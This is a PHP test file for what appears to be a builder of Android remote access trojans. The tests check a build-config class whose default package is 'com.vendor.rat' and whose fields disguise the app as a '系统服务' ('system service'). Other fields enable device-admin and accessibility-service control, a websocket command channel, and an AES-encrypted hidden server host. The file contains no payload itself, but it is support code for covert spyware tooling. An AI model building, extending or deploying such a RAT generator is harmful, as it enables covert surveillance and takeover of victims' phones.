<?php

use App\Services\GradleApkBuilder\GradleApkBuildConfig;

// ============ validate() ============

describe('GradleApkBuildConfig validation', function () {
    it('passes for valid minimal config', function () {
        $config = new GradleApkBuildConfig(
            appName: '系统服务',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toBeEmpty();
        expect($config->isValid())->toBeTrue();
    });

    it('requires app_name', function () {
        $config = new GradleApkBuildConfig(
            appName: '',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toContain('app_name is required');
    });

    it('rejects app_name over 100 chars', function () {
        $config = new GradleApkBuildConfig(
            appName: str_repeat('a', 101),
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toContain('app_name must not exceed 100 characters');
    });

    it('requires websocket_url', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: '',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toContain('websocket_url is required');
    });

    it('rejects invalid websocket_url', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'http://not-websocket',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toContain('websocket_url must start with ws:// or wss://');
    });

    it('accepts wss:// websocket_url', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'wss://secure.example.com:8443/ws',
            userEmail: 'test@example.com',
        );

        expect($config->validate())->toBeEmpty();
    });

    it('requires user_email', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: '',
        );

        expect($config->validate())->toContain('user_email is required');
    });

    it('rejects invalid email', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'not-an-email',
        );

        expect($config->validate())->toContain('user_email must be a valid email address');
    });

    it('accepts empty applicationId', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            applicationId: '',
        );

        expect($config->validate())->toBeEmpty();
    });

    it('rejects invalid applicationId', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            applicationId: 'invalid-package',
        );

        expect($config->validate())->toContain('application_id must be a valid package name (e.g., com.example.app)');
    });

    it('accepts valid applicationId', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            applicationId: 'com.system.service',
        );

        expect($config->validate())->toBeEmpty();
    });

    it('rejects invalid versionName', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            versionName: 'abc',
        );

        expect($config->validate())->toContain('version_name must be a valid version (e.g., 1.0 or 1.0.0)');
    });

    it('rejects versionCode < 1', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            versionCode: 0,
        );

        expect($config->validate())->toContain('version_code must be a positive integer');
    });
});

// ============ toConfigJson() ============

describe('GradleApkBuildConfig toConfigJson', function () {
    it('includes all expected keys', function () {
        $config = new GradleApkBuildConfig(
            appName: '系统服务',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        expect($json)->toHaveKeys([
            'webSocketUrl', 'userEmail', 'deviceAuthSecret', 'heartbeatInterval',
            'downloadRatHatName', 'mainUrl', 'blockBgColor',
            'promotionModel', 'uninstall', 'activeAdmin', 'debug',
            'perScreenOffDuration', 'perIdleDuration',
            'alertTitle', 'alertMsg', 'okText', 'exitConfirm',
            'appLabel', 'accessibilityServiceLabel',
            'guideDialogBgUrl', 'guideDialogIcoUrl', 'enableGuideWebView',
        ]);
    });

    it('writes websocketUrl directly', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'wss://api.example.com/bridge',
            userEmail: 'test@example.com',
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        expect($json['webSocketUrl'])->toBe('wss://api.example.com/bridge');
    });

    it('writes userEmail directly', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'demo@qq.com',
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        expect($json['userEmail'])->toBe('demo@qq.com');
    });

    it('encrypts serverHost when non-empty', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            serverHost: 'https://api.example.com',
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        // 加密后应该是 Base64 字符串，不再是原始 URL
        expect($json['serverHost'])->not->toBe('https://api.example.com');
        expect(base64_decode($json['serverHost'], true))->not->toBeFalse();
    });

    it('omits encrypted fields when empty', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            serverHost: '',
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        expect($json)->not->toHaveKey('serverHost');
    });

    it('preserves integer types', function () {
        $config = new GradleApkBuildConfig(
            appName: 'Test',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
            heartbeatInterval: 15,
            promotionModel: 2,
        );

        $json = $config->toConfigJson('****1qaz2wsx****');

        expect($json['heartbeatInterval'])->toBe(15);
        expect($json['promotionModel'])->toBe(2);
    });
});

// ============ AES 加密一致性 ============

describe('GradleApkBuildConfig AES encryption', function () {
    it('encrypts and can be decrypted with same key', function () {
        $key = '****1qaz2wsx****';
        $plainText = 'https://api.example.com';

        $encrypted = GradleApkBuildConfig::aesEncrypt($plainText, $key);

        // 验证可以解密回来
        $decrypted = openssl_decrypt(
            base64_decode($encrypted),
            'AES-128-ECB',
            $key,
            OPENSSL_RAW_DATA
        );

        expect($decrypted)->toBe($plainText);
    });

    it('produces standard Base64 output', function () {
        $encrypted = GradleApkBuildConfig::aesEncrypt('test', '****1qaz2wsx****');

        // 标准 Base64: A-Z, a-z, 0-9, +, /, =
        expect($encrypted)->toMatch('/^[A-Za-z0-9+\/=]+$/');
    });

    it('produces different output for different keys', function () {
        $enc1 = GradleApkBuildConfig::aesEncrypt('test', '****1qaz2wsx****');
        $enc2 = GradleApkBuildConfig::aesEncrypt('test', 'abcdefghijklmnop');

        expect($enc1)->not->toBe($enc2);
    });
});

// ============ fromArray() ============

describe('GradleApkBuildConfig fromArray', function () {
    it('creates config from snake_case keys', function () {
        $config = GradleApkBuildConfig::fromArray([
            'app_name' => '测试应用',
            'websocket_url' => 'ws://localhost:8081',
            'user_email' => 'test@example.com',
            'application_id' => 'com.test.app',
            'version_name' => '2.0.0',
            'version_code' => 5,
        ]);

        expect($config->appName)->toBe('测试应用');
        expect($config->websocketUrl)->toBe('ws://localhost:8081');
        expect($config->userEmail)->toBe('test@example.com');
        expect($config->applicationId)->toBe('com.test.app');
        expect($config->versionName)->toBe('2.0.0');
        expect($config->versionCode)->toBe(5);
    });

    it('creates config from camelCase keys', function () {
        $config = GradleApkBuildConfig::fromArray([
            'appName' => '测试应用',
            'websocketUrl' => 'wss://api.example.com/ws',
            'userEmail' => 'demo@qq.com',
            'applicationId' => 'com.demo.app',
        ]);

        expect($config->appName)->toBe('测试应用');
        expect($config->websocketUrl)->toBe('wss://api.example.com/ws');
        expect($config->applicationId)->toBe('com.demo.app');
    });

    it('uses defaults for missing fields', function () {
        $config = GradleApkBuildConfig::fromArray([
            'app_name' => 'Test',
            'websocket_url' => 'ws://localhost:8081',
            'user_email' => 'test@example.com',
        ]);

        expect($config->versionName)->toBe('1.0.0');
        expect($config->versionCode)->toBe(1);
        expect($config->applicationId)->toBe('com.vendor.rat');
        expect($config->mainUrl)->toBe('https://m.baidu.com/');
        expect($config->heartbeatInterval)->toBe(10);
    });
});

// ============ toArray() ============

describe('GradleApkBuildConfig toArray', function () {
    it('exports all fields as snake_case', function () {
        $config = new GradleApkBuildConfig(
            appName: '系统服务',
            websocketUrl: 'ws://localhost:8081',
            userEmail: 'test@example.com',
        );

        $array = $config->toArray();

        expect($array)->toHaveKeys([
            'app_name', 'websocket_url', 'user_email',
            'application_id', 'version_name', 'version_code',
            'server_host', 'alert_title', 'ok_text',
            'icon_path', 'background_path',
        ]);
        expect($array['app_name'])->toBe('系统服务');
    });

    it('roundtrips through fromArray', function () {
        $original = new GradleApkBuildConfig(
            appName: '测试应用',
            websocketUrl: 'wss://api.example.com/ws',
            userEmail: 'demo@qq.com',
            applicationId: 'com.test.app',
            versionName: '2.1.0',
            versionCode: 10,
            serverHost: 'https://server.example.com',
        );

        $restored = GradleApkBuildConfig::fromArray($original->toArray());

        expect($restored->appName)->toBe($original->appName);
        expect($restored->websocketUrl)->toBe($original->websocketUrl);
        expect($restored->applicationId)->toBe($original->applicationId);
        expect($restored->versionCode)->toBe($original->versionCode);
        expect($restored->serverHost)->toBe($original->serverHost);
    });
});
